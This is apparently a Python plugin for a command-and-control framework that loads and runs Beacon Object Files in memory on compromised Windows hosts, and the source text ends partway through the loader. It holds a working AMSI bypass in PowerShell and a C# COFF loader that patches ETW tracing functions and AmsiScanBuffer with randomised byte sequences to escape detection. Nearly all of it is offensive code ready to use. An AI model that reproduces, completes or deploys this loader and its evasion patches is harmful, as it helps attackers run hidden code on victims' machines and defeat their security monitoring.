import base64
import gzip
import hashlib
import json
import os
import random
import re
import struct
import subprocess
import time
import zlib

from ..api import plugin, SessionContext

# --------------------------------------------------------------------------
# Per-plugin-process randomization — markers and class name
# --------------------------------------------------------------------------

_RAND = os.urandom(4).hex()          # 8 hex chars, unique per plugin load

_USAGE = """bofloader — load and execute Beacon Object Files (BOFs) in-memory.

  Operator-side subcommands (no session required):
    run bofloader import <file.cna>          Import a CNA, register its BOF commands
    run bofloader delete <name>              Remove a registered BOF command
    run bofloader list                       Show all registered BOF commands
    run bofloader compile <dir|file> [--arch x64|x86|both]
                                             Compile .c or .cpp → .x64.o / .x86.o
                                             (default: both, when available)
    run bofloader info <bof_path>            Inspect a COFF locally (no target contact)

  Target-side subcommands (require a session):
    run bofloader execute <bof_path> [opts]  Execute a BOF on the session
    run bofloader <bof_path> [opts]          Same, shorthand form

  Registered commands (after 'import'):
    bof <name> [args...]                     Run a BOF inside an attached session
    bof <ID> <name> [args...]                Run a BOF from the main menu

  Options for 'execute':
    -arg <value> | --argument <value>        Single string argument passed to the BOF
    --entry <name>                           Entry symbol (default: go, then _go)
    --timeout <sec>                          Transport timeout in seconds (default: 90)
    --save-output <path>                     Save BOF output to a local file

  Argument format (bof_pack):
    The string is delivered as 4-byte LE length + UTF-8 + NUL. The BOF
    parses it with BeaconDataParse / BeaconDataExtract. This plugin does
    not interpret the value.

  Examples:
    run bofloader import ./bofs/whoami.cna
    run bofloader list
    run bofloader compile ./bofs/src
    run bofloader info ./bofs/whoami.x64.o
    run bofloader execute ./bofs/whoami.x64.o
    run bofloader ./bofs/dir.x64.o -arg "C:\\Windows"
    run bofloader delete whoami

    bof whoami                               (inside an attached session)
    bof 3 netuser CORP\\alice /domain        (from the main menu)

  Notes:
    - AMD64 (0x8664) and I386 (0x014c) COFF are both supported. The
      target Windows process architecture must match the BOF.
    - The BOF runs inside the target process; nothing is written to disk.
    - The C# loader class is compiled once per session and reused. No
      plugin reload is required to run another BOF.
    - The registry persists to logs/.tornadorevc2_bofs.json.
    - 'compile' requires mingw gcc/g++ on the operator machine. C sources
      use *-w64-mingw32-gcc; C++ sources use *-w64-mingw32-g++.
    - Beacon APIs provided: BeaconPrintf, BeaconOutput, BeaconDownload,
      BeaconDataParse/Extract/Int/Short/Length,
      BeaconFormatAlloc/Reset/Free/Append/Printf/ToString,
      BeaconAddValue/GetValue/RemoveValue, BeaconIsAdmin,
      BeaconUseToken/RevertToken.
"""

# --------------------------------------------------------------------------
# AMSI bypass — reflection-only, runs before Add-Type
# --------------------------------------------------------------------------

_AMSI_BYPASS_PS = r'''
try {
  $t = [Ref].Assembly.GetType('System.Management.' + 'Automation.Amsi' + 'Utils')
  if ($t) {
    $f = $t.GetField('amsi' + 'Context','NonPublic,Static')
    if ($f) {
      $c = $f.GetValue($null)
      if ($c -and $c -ne [IntPtr]::Zero) {
        # Zero the session handle at offset 8 of the AMSI context struct.
        [System.Runtime.InteropServices.Marshal]::WriteInt64([IntPtr]$c, 8, 0)
      }
    }
    $g = $t.GetField('amsi' + 'InitFailed','NonPublic,Static')
    if ($g) { $g.SetValue($null, $true) }
  }
} catch {}
'''

# --------------------------------------------------------------------------
# Embedded beacon.h — written to a temp dir at compile time when no
# user-supplied copy is found. Standard BOF API contract; the loader
# resolves these symbols at runtime via the C# COFF resolver.
# --------------------------------------------------------------------------

_BEACON_H_C = r'''#ifndef _BEACON_H_
#define _BEACON_H_

#ifdef __cplusplus
extern "C" {
#endif

#include <windows.h>

#define CALLBACK_OUTPUT       0x0
#define CALLBACK_OUTPUT_OEM   0x1e
#define CALLBACK_OUTPUT_UTF8  0x20
#define CALLBACK_ERROR        0x0d
#define CALLBACK_CUSTOM       0x1000

typedef struct {
    char * original;
    char * buffer;
    int    length;
    int    size;
} datap;

typedef struct {
    char * original;
    char * buffer;
    int    length;
    int    size;
} formatp;

/* Output */
void   BeaconPrintf(int type, const char * fmt, ...);
void   BeaconOutput(int type, const char * data, int len);
void   BeaconDownload(const char * data, int len, int type);

/* Data parser */
void   BeaconDataParse(datap * parser, char * buffer, int size);
int    BeaconDataInt(datap * parser);
short  BeaconDataShort(datap * parser);
int    BeaconDataLength(datap * parser);
char * BeaconDataExtract(datap * parser, int * size);

/* Format buffer */
void   BeaconFormatAlloc(formatp * format, int maxsz);
void   BeaconFormatReset(formatp * format);
void   BeaconFormatFree(formatp * format);
void   BeaconFormatAppend(formatp * format, const char * text, int len);
void   BeaconFormatPrintf(formatp * format, const char * fmt, ...);
char * BeaconFormatToString(formatp * format, int * size);

/* Key/value */
int    BeaconAddValue(const char * key, void * value);
void * BeaconGetValue(const char * key);
int    BeaconRemoveValue(const char * key);

/* Token */
BOOL   BeaconIsAdmin(void);
BOOL   BeaconUseToken(HANDLE token);
void   BeaconRevertToken(void);

#ifdef __cplusplus
}
#endif

#endif /* _BEACON_H_ */
'''

# --------------------------------------------------------------------------
# C# helper — OPSEC-hardened COFF loader
# --------------------------------------------------------------------------

_CS_SOURCE = r'''
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

public static class BofLoader {

    // ---- Win32 ----
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    static extern IntPtr LoadLibraryA(string name);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    static extern IntPtr GetProcAddress(IntPtr mod, string name);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    static extern IntPtr GetModuleHandleA(string name);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll")]
    static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);
    [DllImport("kernel32.dll")]
    static extern uint RemoveVectoredExceptionHandler(IntPtr handle);

    [DllImport("ntdll.dll")]
    static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr baseAddress,
        byte[] buffer, uint size, out uint written);

    [DllImport("ntdll.dll")]
    static extern int NtProtectVirtualMemory(IntPtr hProcess, ref IntPtr baseAddr,
        ref IntPtr size, uint newProtect, out uint oldProtect);

    const uint MEM_COMMIT         = 0x1000;
    const uint MEM_RESERVE        = 0x2000;
    const uint MEM_RELEASE        = 0x8000;
    const uint PAGE_READONLY      = 0x02;
    const uint PAGE_READWRITE     = 0x04;
    const uint PAGE_EXECUTE_READ  = 0x20;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
    const uint IMAGE_SCN_MEM_READ    = 0x40000000;
    const uint IMAGE_SCN_MEM_WRITE   = 0x80000000;

    const int  MAX_OUTPUT_BYTES = 4 * 1024 * 1024;
    const int  PAGE_SIZE        = 0x1000;

    // Try direct RX allocation + NtWriteVirtualMemory for executable sections.
    // Falls back to RW + VirtualProtect if the kernel rejects the write.
    const bool TRY_RX_WRITE = true;

    static StringBuilder _out = new StringBuilder(4096);

    // =====================================================================
    // OPSEC: ETW + AMSI in-process patches (best-effort, once per process)
    // =====================================================================

    static bool _patched = false;
    static Random _rng = new Random();

    static void _WriteBytes(IntPtr addr, byte[] patch) {
        if (addr == IntPtr.Zero) return;
        uint old;
        IntPtr a = addr, sz = (IntPtr)patch.Length;
        if (NtProtectVirtualMemory(GetCurrentProcess(), ref a, ref sz,
                                   PAGE_EXECUTE_READWRITE, out old) != 0) return;
        Marshal.Copy(patch, 0, addr, patch.Length);
        IntPtr a2 = addr, sz2 = (IntPtr)patch.Length;
        NtProtectVirtualMemory(GetCurrentProcess(), ref a2, ref sz2, old, out old);
    }

    static void _ApplyPatchesOnce() {
        if (_patched) return;
        _patched = true;
        try {
            IntPtr ntdll = GetModuleHandleA("ntdll.dll");
            if (ntdll != IntPtr.Zero) {
                // Three equivalent no-op variants. The caller sees a normal
                // return either way; the byte sequence differs per process.
                byte[][] variants = new byte[][] {
                    new byte[] { 0xC3 },                          // ret
                    new byte[] { 0x31, 0xC0, 0xC3 },              // xor eax,eax; ret
                    new byte[] { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }, // mov eax,0; ret
                };
                byte[] pick = variants[_rng.Next(variants.Length)];

                IntPtr e1 = GetProcAddress(ntdll, "EtwEventWrite");
                IntPtr e2 = GetProcAddress(ntdll, "EtwEventWriteFull");
                IntPtr e3 = GetProcAddress(ntdll, "EtwEventWriteEx");
                IntPtr e4 = GetProcAddress(ntdll, "EtwEventWriteTransfer");
                IntPtr e5 = GetProcAddress(ntdll, "EtwEventWriteString");
                IntPtr e6 = GetProcAddress(ntdll, "NtTraceEvent");
                _WriteBytes(e1, pick);
                _WriteBytes(e2, pick);
                _WriteBytes(e3, pick);
                _WriteBytes(e4, pick);
                _WriteBytes(e5, pick);
                _WriteBytes(e6, pick);
            }
            // AmsiScanBuffer -> return an HRESULT the caller treats as a
            // benign non-match. Variant picked per process.
            IntPtr amsi = GetModuleHandleA("amsi.dll");
            if (amsi == IntPtr.Zero) amsi = LoadLibraryA("amsi.dll");
            if (amsi != IntPtr.Zero) {
                byte[][] amsiVariants = new byte[][] {
                    new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, // E_INVALIDARG
                    new byte[] { 0xB8, 0x05, 0x00, 0x04, 0x80, 0xC3 }, // E_FAIL
                    new byte[] { 0xB8, 0x0E, 0x00, 0x07, 0x80, 0xC3 }, // E_OUTOFMEMORY
                };
                IntPtr sb = GetProcAddress(amsi, "AmsiScanBuffer");
                _WriteBytes(sb, amsiVariants[_rng.Next(amsiVariants.Length)]);
            }
        } catch { /* best-effort */ }
    }

    // =====================================================================
    // Beacon API: output
    // =====================================================================

    delegate void D_BeaconPrintf(int type, IntPtr fmt,
        IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5,
        IntPtr a6, IntPtr a7, IntPtr a8, IntPtr a9, IntPtr a10);
    delegate void D_BeaconOutput(int type, IntPtr data, int len);
    delegate void D_BeaconDownload(IntPtr data, int len, int type);

    static D_BeaconPrintf  _del_printf   = _BeaconPrintfImpl;
    static D_BeaconOutput  _del_output   = _BeaconOutputImpl;
    static D_BeaconDownload _del_download = _BeaconDownloadImpl;

    static void _AppendOut(string s) {
        if (s == null || s.Length == 0) return;
        int room = MAX_OUTPUT_BYTES - _out.Length;
        if (room <= 0) return;
        if (s.Length <= room) _out.Append(s);
        else _out.Append(s, 0, room);
    }

    static void _BeaconPrintfImpl(int type, IntPtr fmt,
            IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5,
            IntPtr a6, IntPtr a7, IntPtr a8, IntPtr a9, IntPtr a10) {
        if (fmt == IntPtr.Zero) return;
        string f = Marshal.PtrToStringAnsi(fmt);
        if (f == null) return;
        IntPtr[] argv = new IntPtr[] { a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 };
        _AppendOut(_Format(f, argv));
    }

    static void _BeaconOutputImpl(int type, IntPtr data, int len) {
        if (len <= 0 || data == IntPtr.Zero) return;
        byte[] buf = new byte[len];
        Marshal.Copy(data, buf, 0, len);
        _AppendOut(Encoding.UTF8.GetString(buf));
    }

    static void _BeaconDownloadImpl(IntPtr data, int len, int type) {
        if (len <= 0 || data == IntPtr.Zero) return;
        byte[] buf = new byte[len];
        Marshal.Copy(data, buf, 0, len);
        _AppendOut("[download " + len + " bytes] " + Convert.ToBase64String(buf) + "\n");
    }

    static string _Format(string fmt, IntPtr[] args) {
        StringBuilder sb = new StringBuilder(fmt.Length + 32);
        int ai = 0, fi = 0;
        while (fi < fmt.Length) {
            char c = fmt[fi++];
            if (c != '%') { sb.Append(c); continue; }
            if (fi >= fmt.Length) { sb.Append('%'); break; }
            while (fi < fmt.Length && "-+ #0".IndexOf(fmt[fi]) >= 0) fi++;
            while (fi < fmt.Length && char.IsDigit(fmt[fi])) fi++;
            if (fi < fmt.Length && fmt[fi] == '.') {
                fi++;
                while (fi < fmt.Length && char.IsDigit(fmt[fi])) fi++;
            }
            while (fi < fmt.Length && "lhqLzIjt".IndexOf(fmt[fi]) >= 0) fi++;
            if (fi >= fmt.Length) break;
            char spec = fmt[fi++];
            if (spec == '%') { sb.Append('%'); continue; }
            IntPtr v = (ai < args.Length) ? args[ai++] : IntPtr.Zero;
            switch (spec) {
                case 's': sb.Append(Marshal.PtrToStringAnsi(v) ?? ""); break;
                case 'S': sb.Append(Marshal.PtrToStringUni(v) ?? ""); break;
                case 'd': case 'i': sb.Append(v.ToInt64().ToString()); break;
                case 'u': sb.Append(((ulong)v.ToInt64()).ToString()); break;
                case 'x': sb.Append(v.ToInt64().ToString("x")); break;
                case 'X': sb.Append(v.ToInt64().ToString("X")); break;
                case 'p': sb.Append("0x" + v.ToInt64().ToString("x")); break;
                case 'c': sb.Append((char)(v.ToInt32() & 0xFF)); break;
                case 'f': case 'F': case 'e': case 'E':
                case 'g': case 'G': sb.Append('?'); break;
                default: sb.Append('%'); sb.Append(spec); break;
            }
        }
        return sb.ToString();
    }

    // =====================================================================
    // Beacon API: data parser
    // =====================================================================

    [StructLayout(LayoutKind.Sequential)]
    struct DATAP { public IntPtr original; public IntPtr buffer; public int length; public int size; }

    delegate int    D_DataParse(IntPtr p, IntPtr b, int s);
    delegate IntPtr D_DataExtract(IntPtr p, IntPtr sz);
    delegate int    D_DataInt(IntPtr p);
    delegate short  D_DataShort(IntPtr p);
    delegate int    D_DataLength(IntPtr p);

    static int _DataParse(IntPtr p, IntPtr b, int s) {
        DATAP dp = new DATAP();
        dp.original = b; dp.buffer = b; dp.length = s; dp.size = s;
        Marshal.StructureToPtr(dp, p, false);
        return 0;
    }
    static IntPtr _DataExtract(IntPtr p, IntPtr sz) {
        DATAP dp = (DATAP)Marshal.PtrToStructure(p, typeof(DATAP));
        if (dp.length < 4) return IntPtr.Zero;
        int len = Marshal.ReadInt32(dp.buffer);
        if (len < 0 || len > dp.length - 4) return IntPtr.Zero;
        IntPtr data = (IntPtr)((long)dp.buffer + 4);
        dp.buffer = (IntPtr)((long)data + len);
        dp.length -= 4 + len;
        Marshal.StructureToPtr(dp, p, false);
        if (sz != IntPtr.Zero) Marshal.WriteInt32(sz, len);
        return data;
    }
    static int _DataInt(IntPtr p) {
        DATAP dp = (DATAP)Marshal.PtrToStructure(p, typeof(DATAP));
        if (dp.length < 4) return 0;
        int v = Marshal.ReadInt32(dp.buffer);
        dp.buffer = (IntPtr)((long)dp.buffer + 4); dp.length -= 4;
        Marshal.StructureToPtr(dp, p, false);
        return v;
    }
    static short _DataShort(IntPtr p) {
        DATAP dp = (DATAP)Marshal.PtrToStructure(p, typeof(DATAP));
        if (dp.length < 2) return 0;
        short v = Marshal.ReadInt16(dp.buffer);
        dp.buffer = (IntPtr)((long)dp.buffer + 2); dp.length -= 2;
        Marshal.StructureToPtr(dp, p, false);
        return v;
    }
    static int _DataLength(IntPtr p) {
        DATAP dp = (DATAP)Marshal.PtrToStructure(p, typeof(DATAP));
        return dp.length;
    }

    static D_DataParse   _del_dparse = _DataParse;
    static D_DataExtract _del_dext   = _DataExtract;
    static D_DataInt     _del_dint   = _DataInt;
    static D_DataShort   _del_dshort = _DataShort;
    static D_DataLength  _del_dlen   = _DataLength;

    // =====================================================================
    // Beacon API: format buffer
    // =====================================================================

    [StructLayout(LayoutKind.Sequential)]
    struct FORMATP { public IntPtr original; public IntPtr buffer; public int length; public int size; }

    static List<IntPtr> _fmtAllocs = new List<IntPtr>();

    delegate IntPtr D_FmtAlloc(IntPtr p, int maxsz);
    delegate void   D_FmtReset(IntPtr p);
    delegate void   D_FmtFree(IntPtr p);
    delegate void   D_FmtAppend(IntPtr p, IntPtr text, int len);
    delegate void   D_FmtPrintf(IntPtr p, IntPtr fmt, IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4);
    delegate IntPtr D_FmtToString(IntPtr p, IntPtr sz);

    static IntPtr _FmtAlloc(IntPtr p, int maxsz) {
        if (maxsz <= 0) maxsz = PAGE_SIZE;
        IntPtr buf = VirtualAlloc(IntPtr.Zero, (UIntPtr)maxsz,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (buf == IntPtr.Zero) return IntPtr.Zero;
        _fmtAllocs.Add(buf);
        FORMATP fp = new FORMATP();
        fp.original = buf; fp.buffer = buf; fp.length = 0; fp.size = maxsz;
        Marshal.StructureToPtr(fp, p, false);
        return buf;
    }
    static void _FmtReset(IntPtr p) {
        FORMATP fp = (FORMATP)Marshal.PtrToStructure(p, typeof(FORMATP));
        fp.buffer = fp.original; fp.length = 0;
        Marshal.StructureToPtr(fp, p, false);
    }
    static void _FmtFree(IntPtr p) {
        FORMATP fp = (FORMATP)Marshal.PtrToStructure(p, typeof(FORMATP));
        if (fp.original != IntPtr.Zero) {
            VirtualFree(fp.original, UIntPtr.Zero, MEM_RELEASE);
            _fmtAllocs.Remove(fp.original);
        }
        fp.original = IntPtr.Zero; fp.buffer = IntPtr.Zero;
        fp.length = 0; fp.size = 0;
        Marshal.StructureToPtr(fp, p, false);
    }
    static void _FmtAppend(IntPtr p, IntPtr text, int len) {
        if (len <= 0 || text == IntPtr.Zero) return;
        FORMATP fp = (FORMATP)Marshal.PtrToStructure(p, typeof(FORMATP));
        if (fp.buffer == IntPtr.Zero || fp.length + len > fp.size) return;
        byte[] data = new byte[len];
        Marshal.Copy(text, data, 0, len);
        Marshal.Copy(data, 0, (IntPtr)((long)fp.buffer + fp.length), len);
        fp.length += len;
        Marshal.StructureToPtr(fp, p, false);
    }
    static void _FmtPrintf(IntPtr p, IntPtr fmt, IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4) {
        if (fmt == IntPtr.Zero) return;
        string f = Marshal.PtrToStringAnsi(fmt);
        if (f == null) return;
        string s = _Format(f, new IntPtr[] { a1, a2, a3, a4 });
        byte[] bytes = Encoding.ASCII.GetBytes(s);
        FORMATP fp = (FORMATP)Marshal.PtrToStructure(p, typeof(FORMATP));
        if (fp.buffer == IntPtr.Zero || fp.length + bytes.Length > fp.size) return;
        Marshal.Copy(bytes, 0, (IntPtr)((long)fp.buffer + fp.length), bytes.Length);
        fp.length += bytes.Length;
        Marshal.StructureToPtr(fp, p, false);
    }
    static IntPtr _FmtToString(IntPtr p, IntPtr sz) {
        FORMATP fp = (FORMATP)Marshal.PtrToStructure(p, typeof(FORMATP));
        if (sz != IntPtr.Zero) Marshal.WriteInt32(sz, fp.length);
        return fp.original;
    }

    static D_FmtAlloc    _del_falloc  = _FmtAlloc;
    static D_FmtReset    _del_freset  = _FmtReset;
    static D_FmtFree     _del_ffree   = _FmtFree;
    static D_FmtAppend   _del_fappend = _FmtAppend;
    static D_FmtPrintf   _del_fprintf = _FmtPrintf;
    static D_FmtToString _del_ftostr  = _FmtToString;

    // =====================================================================
    // Beacon API: key/value + misc
    // =====================================================================

    static Dictionary<string, IntPtr> _kv = new Dictionary<string, IntPtr>();
    static bool   _AddValue(string k, IntPtr v) { if (k == null) return false; _kv[k] = v; return true; }
    static IntPtr _GetValue(string k) { if (k == null) return IntPtr.Zero; IntPtr v; return _kv.TryGetValue(k, out v) ? v : IntPtr.Zero; }
    static bool   _RemoveValue(string k) { if (k == null) return false; return _kv.Remove(k); }

    delegate bool   D_AddValue(string k, IntPtr v);
    delegate IntPtr D_GetValue(string k);
    delegate bool   D_RemoveValue(string k);

    static D_AddValue    _del_add = _AddValue;
    static D_GetValue    _del_get = _GetValue;
    static D_RemoveValue _del_rem = _RemoveValue;

    static bool _IsAdmin() {
        try {
            var id = System.Security.Principal.WindowsIdentity.GetCurrent();
            var p  = new System.Security.Principal.WindowsPrincipal(id);
            return p.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        } catch { return false; }
    }
    delegate bool D_IsAdmin();
    static D_IsAdmin _del_admin = _IsAdmin;

    delegate bool D_UseToken(IntPtr token);
    delegate bool D_RevertToken();
    static bool _UseToken(IntPtr t) { return false; }
    static bool _RevertToken() { return false; }
    static D_UseToken    _del_usetk = _UseToken;
    static D_RevertToken _del_rvtk  = _RevertToken;

    // =====================================================================
    // Vectored exception handler (best-effort)
    // =====================================================================

    delegate int D_VEH(IntPtr info);
    static int _vehFired = 0;
    static D_VEH _vehDel = _VehCb;
    static int _VehCb(IntPtr info) { _vehFired = 1; return 0; /* CONTINUE_SEARCH */ }

    // =====================================================================
    // Symbol resolution (cached)
    // =====================================================================

    static Dictionary<string, IntPtr> _symCache =
        new Dictionary<string, IntPtr>(StringComparer.Ordinal);

    static readonly string[] _fallbackLibs = {
        "kernel32.dll", "user32.dll", "advapi32.dll", "ntdll.dll",
        "msvcrt.dll", "shell32.dll", "ws2_32.dll", "netapi32.dll",
        "ole32.dll", "oleaut32.dll", "shlwapi.dll", "crypt32.dll",
        "bcrypt.dll", "secur32.dll", "iphlpapi.dll", "winhttp.dll",
        "wininet.dll", "psapi.dll", "version.dll", "dbghelp.dll"
    };

    static IntPtr _Resolve(string name) {
        IntPtr cached;
        if (_symCache.TryGetValue(name, out cached)) return cached;

        IntPtr result;
        switch (name) {
            case "BeaconPrintf":     result = Marshal.GetFunctionPointerForDelegate(_del_printf); break;
            case "BeaconOutput":     result = Marshal.GetFunctionPointerForDelegate(_del_output); break;
            case "BeaconDownload":   result = Marshal.GetFunctionPointerForDelegate(_del_download); break;
            case "BeaconDataParse":  result = Marshal.GetFunctionPointerForDelegate(_del_dparse); break;
            case "BeaconDataExtract":result = Marshal.GetFunctionPointerForDelegate(_del_dext); break;
            case "BeaconDataInt":    result = Marshal.GetFunctionPointerForDelegate(_del_dint); break;
            case "BeaconDataShort":  result = Marshal.GetFunctionPointerForDelegate(_del_dshort); break;
            case "BeaconDataLength": result = Marshal.GetFunctionPointerForDelegate(_del_dlen); break;
            case "BeaconFormatAlloc":  result = Marshal.GetFunctionPointerForDelegate(_del_falloc); break;
            case "BeaconFormatReset":  result = Marshal.GetFunctionPointerForDelegate(_del_freset); break;
            case "BeaconFormatFree":   result = Marshal.GetFunctionPointerForDelegate(_del_ffree); break;
            case "BeaconFormatAppend": result = Marshal.GetFunctionPointerForDelegate(_del_fappend); break;
            case "BeaconFormatPrintf": result = Marshal.GetFunctionPointerForDelegate(_del_fprintf); break;
            case "BeaconFormatToString": result = Marshal.GetFunctionPointerForDelegate(_del_ftostr); break;
            case "BeaconAddValue":   result = Marshal.GetFunctionPointerForDelegate(_del_add); break;
            case "BeaconGetValue":   result = Marshal.GetFunctionPointerForDelegate(_del_get); break;
            case "BeaconRemoveValue":result = Marshal.GetFunctionPointerForDelegate(_del_rem); break;
            case "BeaconIsAdmin":    result = Marshal.GetFunctionPointerForDelegate(_del_admin); break;
            case "BeaconUseToken":   result = Marshal.GetFunctionPointerForDelegate(_del_usetk); break;
            case "BeaconRevertToken":result = Marshal.GetFunctionPointerForDelegate(_del_rvtk); break;
            default:
                if (name.StartsWith("Beacon")) {
                    result = IntPtr.Zero;
                } else if (name.IndexOf('$') > 0) {
                    int d = name.IndexOf('$');
                    string lib  = name.Substring(0, d) + ".dll";
                    string func = name.Substring(d + 1);
                    IntPtr h = LoadLibraryA(lib);
                    if (h == IntPtr.Zero) h = GetModuleHandleA(lib);
                    if (h == IntPtr.Zero)
                        throw new Exception("LoadLibrary failed: " + lib +
                            " (err=" + Marshal.GetLastWin32Error() + ")");
                    IntPtr a = GetProcAddress(h, func);
                    if (a == IntPtr.Zero)
                        throw new Exception("GetProcAddress failed: " + name +
                            " (err=" + Marshal.GetLastWin32Error() + ")");
                    result = a;
                } else if (name.StartsWith("__imp_")) {
                    IntPtr real = _Resolve(name.Substring(6));
                    IntPtr slot = VirtualAlloc(IntPtr.Zero, (UIntPtr)8,
                                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    if (slot == IntPtr.Zero)
                        throw new Exception("VirtualAlloc failed for __imp_ slot");
                    _fmtAllocs.Add(slot);
                    Marshal.WriteIntPtr(slot, real);
                    result = slot;
                } else {
                    IntPtr found = IntPtr.Zero;
                    foreach (string lib in _fallbackLibs) {
                        IntPtr h = GetModuleHandleA(lib);
                        if (h == IntPtr.Zero) continue;
                        IntPtr a = GetProcAddress(h, name);
                        if (a != IntPtr.Zero) { found = a; break; }
                    }
                    if (found == IntPtr.Zero)
                        throw new Exception("Unresolved symbol: " + name);
                    result = found;
                }
                break;
        }
        _symCache[name] = result;
        return result;
    }

    // =====================================================================
    // COFF byte helpers
    // =====================================================================

    static ushort _RU16(byte[] d, int o) { return (ushort)(d[o] | (d[o+1] << 8)); }
    static uint   _RU32(byte[] d, int o) {
        return (uint)(d[o] | (d[o+1] << 8) | (d[o+2] << 16) | (d[o+3] << 24));
    }
    static ulong  _RU64(byte[] d, int o) {
        return (ulong)_RU32(d, o) | ((ulong)_RU32(d, o+4) << 32);
    }
    static short  _RS16(byte[] d, int o) { return (short)_RU16(d, o); }
    static int    _AlignUp(int v, int a) { return (v + a - 1) & ~(a - 1); }

    static uint _FinalProt(uint chars) {
        bool x = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
        bool w = (chars & IMAGE_SCN_MEM_WRITE)   != 0;
        bool r = (chars & IMAGE_SCN_MEM_READ)    != 0;
        if (x) return PAGE_EXECUTE_READ;
        if (w) return PAGE_READWRITE;
        if (r) return PAGE_READONLY;
        return PAGE_READWRITE;
    }

    // Write 4 or 8 bytes to a target address, optionally via NtWriteVirtualMemory
    // when the page is already executable (avoids a VirtualProtect flip).
    static void _WriteI32(IntPtr addr, int val, bool viaKernel) {
        if (viaKernel) {
            byte[] b = BitConverter.GetBytes(val);
            uint w;
            NtWriteVirtualMemory(GetCurrentProcess(), addr, b, 4, out w);
        } else {
            Marshal.WriteInt32(addr, val);
        }
    }
    static void _WriteI64(IntPtr addr, long val, bool viaKernel) {
        if (viaKernel) {
            byte[] b = BitConverter.GetBytes(val);
            uint w;
            NtWriteVirtualMemory(GetCurrentProcess(), addr, b, 8, out w);
        } else {
            Marshal.WriteInt64(addr, val);
        }
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    delegate void BofEntry(IntPtr args, int alen);

    // =====================================================================
    // Entry point
    // =====================================================================

    public static string[] ExecuteBof(byte[] bof, string entryName, byte[] packedArgs) {
        _out.Length = 0;
        _kv.Clear();

        // OPSEC: suppress ETW and patch AMSI before any memory work.
        _ApplyPatchesOnce();

        if (bof == null || bof.Length < 20) throw new Exception("BOF too small");

        ushort machine = _RU16(bof, 0);
        bool is64;
        if      (machine == 0x8664) is64 = true;   // AMD64
        else if (machine == 0x014c) is64 = false;  // I386
        else
            throw new Exception("Unsupported COFF machine: 0x" + machine.ToString("X4") +
                                " (only AMD64 and I386 are supported)");

        int nsec   = _RU16(bof, 2);
        int symOff = (int)_RU32(bof, 8);
        int nsym   = (int)_RU32(bof, 12);

        if (nsec <= 0) throw new Exception("COFF has no sections");
        if (symOff <= 0 && nsym > 0) throw new Exception("Invalid symbol table offset");

        // ---- 1. Read section headers ----
        int[]    secRawOff    = new int[nsec];
        int[]    secRawSize   = new int[nsec];
        int[]    secRelocOff  = new int[nsec];
        int[]    secRelocCnt  = new int[nsec];
        uint[]   secChars     = new uint[nsec];
        string[] secNames     = new string[nsec];
        int[]    secAllocSize = new int[nsec];

        for (int i = 0; i < nsec; i++) {
            int off = 20 + i * 40;
            if (off + 40 > bof.Length) throw new Exception("Section header out of bounds");
            byte[] nb = new byte[8];
            Array.Copy(bof, off, nb, 0, 8);
            int nl = 0;
            while (nl < 8 && nb[nl] != 0) nl++;
            secNames[i]    = Encoding.ASCII.GetString(nb, 0, nl);
            int vsize      = (int)_RU32(bof, off + 8);
            secRawSize[i]  = (int)_RU32(bof, off + 16);
            secRawOff[i]   = (int)_RU32(bof, off + 20);
            secRelocOff[i] = (int)_RU32(bof, off + 24);
            secRelocCnt[i] = _RU16(bof, off + 32);
            secChars[i]    = _RU32(bof, off + 36);

            int m = Math.Max(vsize, secRawSize[i]);
            if (m < 1) m = 1;
            secAllocSize[i] = _AlignUp(m, PAGE_SIZE);
        }

        // ---- 2. Contiguous allocation (REL32 safety) ----
        int total = 0;
        int[] secOffsets = new int[nsec];
        for (int i = 0; i < nsec; i++) {
            secOffsets[i] = total;
            total = _AlignUp(total + secAllocSize[i], PAGE_SIZE);
        }

        IntPtr blob = VirtualAlloc(IntPtr.Zero, (UIntPtr)total,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (blob == IntPtr.Zero)
            throw new Exception("VirtualAlloc section blob failed (err=" +
                                Marshal.GetLastWin32Error() + ", size=" + total + ")");

        IntPtr[] secMem = new IntPtr[nsec];
        bool[]   rxWritten = new bool[nsec];

        try {
            // ---- 3. Map sections ----
            for (int i = 0; i < nsec; i++) {
                secMem[i] = (IntPtr)((long)blob + secOffsets[i]);
                bool exec = (secChars[i] & IMAGE_SCN_MEM_EXECUTE) != 0;

                if (exec && TRY_RX_WRITE && secRawSize[i] > 0) {
                    // Attempt direct write into an RX page via the kernel.
                    // Pages are currently RW (blob allocation), so try
                    // after flipping to RX first.
                    uint old;
                    VirtualProtect(secMem[i], (UIntPtr)secAllocSize[i],
                                   PAGE_EXECUTE_READ, out old);
                    byte[] raw = new byte[secRawSize[i]];
                    Array.Copy(bof, secRawOff[i], raw, 0, secRawSize[i]);
                    uint written;
